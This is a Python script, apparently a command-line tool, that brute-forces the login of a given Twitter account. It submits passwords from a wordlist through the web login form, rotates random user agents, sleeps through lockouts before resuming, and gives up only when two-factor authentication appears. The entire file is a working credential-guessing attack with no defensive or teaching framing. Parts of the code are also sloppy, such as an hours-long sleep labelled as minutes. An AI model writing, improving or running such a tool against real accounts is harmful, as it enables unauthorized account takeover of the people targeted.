#!/usr/bin/env  python3.6
import mechanicalsoup
import argparse
import random
import time
def login(username, password,agent,verb=False):
    global response
    browser = mechanicalsoup.StatefulBrowser(soup_config={'features': 'lxml'},user_agent=agent)
    #browser.set_user_agent(agent)
    browser.open("https://www.twitter.com")
    if verb:
        print(browser.get_current_page())
    try:
        browser.select_form('form[action="/sessions"]')
    finally:
        browser.get_current_form().print_summary()
        browser['session[username_or_email]'] = username
        browser['session[password]'] = password
        response = browser.submit_selected()
        return response.text

def main():
    parser = argparse.ArgumentParser(prog='Twitter-CLI')
    parser.add_argument('-u','--user',help='Twitter username',required=True)
    parser.add_argument('-p','--password',help='Password file',required=True)
    parser.add_argument('-a','--agent',help='UserAgent file',required=True)
    parser.add_argument('-ver', '--verbose',help='Set Verbose')
    args = parser.parse_args()
    username = args.user
    pf = args.password
    ua = args.agent
    verb = args.verbose
    passlist = open(pf,'r')
    agentlist = []
    def getagent(ua):
        user_list = open(ua, 'r')
        global agent
        agent = None
        if agent not in agentlist:
            agent = random.choice([x.strip('\n') for x in user_list.readlines()])
            agentlist.append(agent)
            return agent

    for password in passlist.readlines():
        agent = getagent(ua)
        password = password.lstrip().rstrip().strip('\n')
        if verb:
            login(username,password,agent,verb=True)
        else:
            login(username,password,agent)
        print(response.text)
        if 'Yikes! We need you to wait for a bit before trying to login again' in response.text:
            print("Fuck account got locked out, Sleeping for %d"  %(60) + 'Minutes')
            time.sleep((60*60*60))
        if "six-digit code and enter it in the box below to log in" in response.text:
            print('2FA Enabled, Youre Fucked')
            break

if __name__ == '__main__':
    main()